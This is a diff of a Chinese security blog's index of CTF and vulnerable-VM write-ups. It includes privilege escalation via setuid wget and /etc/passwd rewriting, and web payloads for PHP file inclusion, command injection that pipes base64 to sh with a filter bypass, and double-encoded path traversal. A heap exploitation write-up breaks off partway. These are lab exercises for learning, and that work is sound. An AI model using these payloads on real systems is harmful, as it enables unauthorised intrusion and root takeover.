+<img src="five86:1/image-20200710153724798.png" alt="image-20200710153724798" style="zoom:50%;" />
+
+<p>发现可以不用密码 以 jen 的身份运行 <code>/bin/cp</code>，那就把<code>ssh密钥</code>给它拷贝到jen里面，实现用户切换</p>
+<img src="five86:1/image-20200710153836025.png" alt="image-20200710153836025" style="zoom:50%;" />
+
+<p>ssh连接到jen账户</p>
+<p>提示在<code>/var/mail/jen</code>下有一封邮件</p>
+<img src="five86:1/image-20200710154036607.png" alt="image-20200710154036607" style="zoom: 33%;" />
+
+
+
+<p>得到了<code>moss</code>的密码，切换到 moss用户</p>
+<p>发现其目录下有一个有<code>setuid</code>权限的<code>root</code>账户的程序</p>
+<img src="five86:1/image-20200710154142971.png" alt="image-20200710154142971" style="zoom:50%;" />
+
+<p>运行之后，不论输入啥，都可以得到root权限</p>
+<img src="five86:1/image-20200710154217425.png" alt="image-20200710154217425" style="zoom:50%;" />
+
+
+
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>DC</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>opennetadmin</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vulnhub hacks:Os-ByteSec靶机</title>
     <url>//Os-ByteSec.html</url>
     <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
@@ -1002,78 +1002,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub hacks:Os-hacknos-1靶机</title>
-    <url>//Os-hacknos.html</url>
-    <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
-<p>简单/中等难度</p>
-<a id="more"></a>
-
-
-
-<h1 id="Os-hacknos-1"><a href="#Os-hacknos-1" class="headerlink" title="Os-hacknos-1"></a>Os-hacknos-1</h1><p>靶机的ip地址为<code>192.168.2.175</code></p>
-<p>开放端口<code>22 80</code></p>
-<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问之后的页面是一个默认页面</p>
-<img src="hacknos:Os-hacknos:1/image-20200726154227817.png" alt="image-20200726154227817" style="zoom:50%;" />
-
-<p>扫描一下目录</p>
-<p><code>dirb http://192.168.2.175 /usr/share/wordlist/dirb/big.txt</code></p>
-<p><img src="hacknos:Os-hacknos:1/image-20200726154358206.png" alt="image-20200726154358206"></p>
-<p>发现是一个<code>drupal</code>的网站</p>
-<p>进去访问之后，也没有啥东西</p>
-<img src="hacknos:Os-hacknos:1/image-20200726154431342.png" alt="image-20200726154431342" style="zoom:50%;" />
-
-<p>尝试使用<code>msfconsole</code>的<code>search</code>寻找一下</p>
-<p>这里选用的是</p>
-<img src="hacknos:Os-hacknos:1/image-20200726154657427.png" alt="image-20200726154657427" style="zoom:50%;" />
-
-<p>设置一下参数</p>
-<img src="hacknos:Os-hacknos:1/image-20200726154856710.png" alt="image-20200726154856710" style="zoom:50%;" />
-
-<p>看到出现了<code>opened</code>表示成功了</p>
-<img src="hacknos:Os-hacknos:1/image-20200726155014184.png" alt="image-20200726155014184" style="zoom:50%;" />
-
-
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>得到shell之后，在<code>../</code>(<code>/var/www/</code>)目录下发现了一个</p>
-<img src="hacknos:Os-hacknos:1/image-20200726155224282.png" alt="image-20200726155224282" style="zoom:50%;" />
-
-<p>里面是一段base64</p>
-<p>解密出来之后是一段<code>brain fuck</code></p>
-<img src="hacknos:Os-hacknos:1/image-20200726155315147.png" alt="image-20200726155315147" style="zoom:50%;" />
-
-<p>再次解密之后</p>
-<img src="hacknos:Os-hacknos:1/image-20200726155718450.png" alt="image-20200726155718450" style="zoom:50%;" />
-
-<p>得到了<code>james</code>的密码是<code>Hacker@4514</code></p>
-<p>使用ssh连接，发现并不可以，su也不能切换</p>
-<img src="hacknos:Os-hacknos:1/image-20200726160048138.png" alt="image-20200726160048138" style="zoom:50%;" />
-
-<img src="hacknos:Os-hacknos:1/image-20200726160058487.png" alt="image-20200726160058487" style="zoom:50%;" />
-
-<p>那只能继续找提权的东西</p>
-<img src="hacknos:Os-hacknos:1/image-20200726160159528.png" alt="image-20200726160159528" style="zoom:50%;" />
-
-<p>发现<code>wget</code>有<code>setuid</code>权限，可以用它写入<code>/root/.ssh/</code>(但是并没有这个目录)</p>
-<p>考虑使用<code>/etc/passwd</code>，先把里面的内容拷贝到一个文件里，然后使用openssl生成一个密码，加入账户中</p>
-<img src="hacknos:Os-hacknos:1/image-20200726160550053.png" alt="image-20200726160550053" style="zoom:50%;" />
-
-<p>然后仿照root的那一行写就行</p>
-<p>使用su，提权到root</p>
-<img src="hacknos:Os-hacknos:1/image-20200726160636869.png" alt="image-20200726160636869" style="zoom:50%;" />
-
-
-
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>hacknos</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>drupal</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulnhub nezikochan靶机</title>
     <url>//nezikochan.html</url>
     <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
@@ -1148,6 +1076,78 @@
       <tags>
         <tag>exploit</tag>
         <tag>opennetadmin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub hacks:Os-hacknos-1靶机</title>
+    <url>//Os-hacknos.html</url>
+    <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
+<p>简单/中等难度</p>
+<a id="more"></a>
+
+
+
+<h1 id="Os-hacknos-1"><a href="#Os-hacknos-1" class="headerlink" title="Os-hacknos-1"></a>Os-hacknos-1</h1><p>靶机的ip地址为<code>192.168.2.175</code></p>
+<p>开放端口<code>22 80</code></p>
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问之后的页面是一个默认页面</p>
+<img src="hacknos:Os-hacknos:1/image-20200726154227817.png" alt="image-20200726154227817" style="zoom:50%;" />
+
+<p>扫描一下目录</p>
+<p><code>dirb http://192.168.2.175 /usr/share/wordlist/dirb/big.txt</code></p>
+<p><img src="hacknos:Os-hacknos:1/image-20200726154358206.png" alt="image-20200726154358206"></p>
+<p>发现是一个<code>drupal</code>的网站</p>
+<p>进去访问之后，也没有啥东西</p>
+<img src="hacknos:Os-hacknos:1/image-20200726154431342.png" alt="image-20200726154431342" style="zoom:50%;" />
+
+<p>尝试使用<code>msfconsole</code>的<code>search</code>寻找一下</p>
+<p>这里选用的是</p>
+<img src="hacknos:Os-hacknos:1/image-20200726154657427.png" alt="image-20200726154657427" style="zoom:50%;" />
+
+<p>设置一下参数</p>
+<img src="hacknos:Os-hacknos:1/image-20200726154856710.png" alt="image-20200726154856710" style="zoom:50%;" />
+
+<p>看到出现了<code>opened</code>表示成功了</p>
+<img src="hacknos:Os-hacknos:1/image-20200726155014184.png" alt="image-20200726155014184" style="zoom:50%;" />
+
+
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>得到shell之后，在<code>../</code>(<code>/var/www/</code>)目录下发现了一个</p>
+<img src="hacknos:Os-hacknos:1/image-20200726155224282.png" alt="image-20200726155224282" style="zoom:50%;" />
+
+<p>里面是一段base64</p>
+<p>解密出来之后是一段<code>brain fuck</code></p>
+<img src="hacknos:Os-hacknos:1/image-20200726155315147.png" alt="image-20200726155315147" style="zoom:50%;" />
+
+<p>再次解密之后</p>
+<img src="hacknos:Os-hacknos:1/image-20200726155718450.png" alt="image-20200726155718450" style="zoom:50%;" />
+
+<p>得到了<code>james</code>的密码是<code>Hacker@4514</code></p>
+<p>使用ssh连接，发现并不可以，su也不能切换</p>
+<img src="hacknos:Os-hacknos:1/image-20200726160048138.png" alt="image-20200726160048138" style="zoom:50%;" />
+
+<img src="hacknos:Os-hacknos:1/image-20200726160058487.png" alt="image-20200726160058487" style="zoom:50%;" />
+
+<p>那只能继续找提权的东西</p>
+<img src="hacknos:Os-hacknos:1/image-20200726160159528.png" alt="image-20200726160159528" style="zoom:50%;" />
+
+<p>发现<code>wget</code>有<code>setuid</code>权限，可以用它写入<code>/root/.ssh/</code>(但是并没有这个目录)</p>
+<p>考虑使用<code>/etc/passwd</code>，先把里面的内容拷贝到一个文件里，然后使用openssl生成一个密码，加入账户中</p>
+<img src="hacknos:Os-hacknos:1/image-20200726160550053.png" alt="image-20200726160550053" style="zoom:50%;" />
+
+<p>然后仿照root的那一行写就行</p>
+<p>使用su，提权到root</p>
+<img src="hacknos:Os-hacknos:1/image-20200726160636869.png" alt="image-20200726160636869" style="zoom:50%;" />
+
+
+
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>hacknos</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>drupal</tag>
       </tags>
   </entry>
   <entry>
@@ -1990,6 +1990,228 @@
       </tags>
   </entry>
   <entry>
+    <title>ACTF2020_新生赛_Include</title>
+    <url>//buu_ACTF2020Include.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结合题目名可以猜测是一个文件包含</p>
+<p>使用<code>php伪协议</code>读一下源码</p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>解码之后是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#39;hacker!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>通过这个文件包含读一下<code>flag.php</code>的源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到了flag</p>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ACTF2020_新生赛_Exec</title>
+    <url>//buu_ACTF2020Exec.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<p>点进靶机界面如下</p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" />
+
+<p>结合题目名，猜测是命令执行</p>
+<p>输入<code>l | ls</code></p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213614575.png" alt="image-20200809213614575" style="zoom:50%;" />
+
+<p>确实是这样，一步一步查找，在根目录下找到了<code>flag</code></p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213701427.png" alt="image-20200809213701427" style="zoom:50%;" />
+
+<p>使用<code>cat</code>命令读取</p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" />
+
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GXYCTF2019_Ping Ping Ping</title>
+    <url>//buu_GXYCTF2019_Ping_Ping_Ping.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><img src="[GXYCTF2019]Ping Ping Ping/image-20200809214947203.png" alt="image-20200809214947203" style="zoom:50%;" />
+
+<p>给了一个参数是<code>ip</code>，猜测也是命令执行</p>
+<p>使用<code>?ip=l;ls</code></p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215038502.png" alt="image-20200809215038502" style="zoom:50%;" />
+
+<p>尝试<code>cat flag.php</code></p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215106353.png" alt="image-20200809215106353" style="zoom:50%;" />
+
+<p>过滤了空格</p>
+<h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>查找资料用于绕过空格</p>
+<p><a href="https://www.freebuf.com/articles/web/137923.html">CTF中绕过小技巧</a></p>
+<p>经过测试发现<code>$IFS$9</code>可以绕过</p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215218599.png" alt="image-20200809215218599" style="zoom:50%;" />
+
+<p>继续读<code>flag.php</code></p>
+<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215246648.png" alt="image-20200809215246648" style="zoom:50%;" />
+
+<p><code>flag</code>也被过滤了</p>
+<p>看一下<code>index.php</code>的代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ....</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="绕过flag"><a href="#绕过flag" class="headerlink" title="绕过flag"></a>绕过flag</h2><p>这里屏蔽了很多语法，但是没有屏蔽<code>base64</code>和<code>sh</code></p>
+<p>使用<code>base64 -d</code>可以达到相同的作用</p>
+<p><code>payload</code>如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;l;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+
+<p>执行之后在注释里面看到<code>flag</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">&lt;pre&gt;PING l (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;3158ae61-1e44-495d-9f83-f63a7c25fd14&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HCTF_2018_WarmUp</title>
+    <url>//buu_HCTF2018_WarmUp.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><p>访问之后是一个滑稽的表情，查看网页源代码提示有一个<code>source.php</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!--source.php--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;br&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg&quot; &#x2F;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="source-php"><a href="#source-php" class="headerlink" title="source.php"></a>source.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>要想达到文件包含</p>
+<ul>
+<li>变量<code>$file</code>不为空</li>
+<li><code>$file</code>要是一个字符串</li>
+<li>能够通过<code>emmm::checkfile</code></li>
+</ul>
+<h3 id="emmm-checkfile"><a href="#emmm-checkfile" class="headerlink" title="emmm:checkfile"></a>emmm:checkfile</h3><p>想要<code>return true</code>就要满足以下条件</p>
+<ul>
+<li><code>$file</code>不为空</li>
+<li><code>$file</code>在两个<code>?</code>字符之间的部分需要在<code>whitelist</code>里面</li>
+</ul>
+<h2 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>告诉了<code>flag</code>存放的位置</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>对<code>?</code>字符进行两次<code>urlencode</code>就可以绕过<code>emmm:checkfile</code>。</p>
+<p>在发送数据到服务器的时候会有一次<code>urldecode</code>，然后在<code>emmm:checkfile</code>中有第二次过滤</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>访问上述url时，服务器将第一次<code>urldecode</code>，结果如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>在执行<code>source.php</code>的过程中，第二次解码之后的数据为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>取到<code>?</code>即<code>source.php</code>通过白名单验证</p>
+<p>至于上面的好多<code>../</code>是由于不知道<code>flag</code>文件的目录，所以只能穷举父级目录<code>../</code></p>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ciscn初赛-nofree</title>
+    <url>//ciscn_nofree.html</url>
+    <content><![CDATA[<p>2020年国赛 初赛pwn题</p>
+<p>由于我是懒狗，现在才想起来写wp（</p>
+<a id="more"></a>
+
+
+
+<h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916171504771.png" alt="image-20200916171504771"></p>
+<p>没有开<code>pie</code>和<code>pelro</code></p>
+<h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbufs();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    edit(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009EF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Management:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1- New &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2- Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> get_int();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正如描述的那样，没有<code>free</code>选项</p>
+<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    result = get_int();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">144</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>] = get_content(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会分配一个堆块，并且把<code>size</code>写进结构体</p>
+<p>但是分配堆块的大小，不是由<code>size</code>决定，而是由<code>strlen(content)</code>决定</p>
+<p>导致了溢出</p>
+<p>并且在add的时候，没有检查堆块是否已经存在，导致无限申请</p>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;heapArray[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      result = sub_400916(*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据<code>size</code>决定，配合<code>add</code>函数造成了堆溢出</p>
+<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>有一种利用堆溢出可以在没有<code>free</code>函数的情况下得到一个<code>unsortedbin</code>堆块（同理也可以得到<code>fastbin</code></p>
+<p>详情请见CTFwiki</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="修改topbin"><a href="#修改topbin" class="headerlink" title="修改topbin"></a>修改topbin</h3><p>首先利用堆溢出修改<code>topbin</code>的大小</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172303763.png" alt="image-20200916172303763"></p>
+<p>运行之后</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172355480.png" alt="image-20200916172355480"></p>
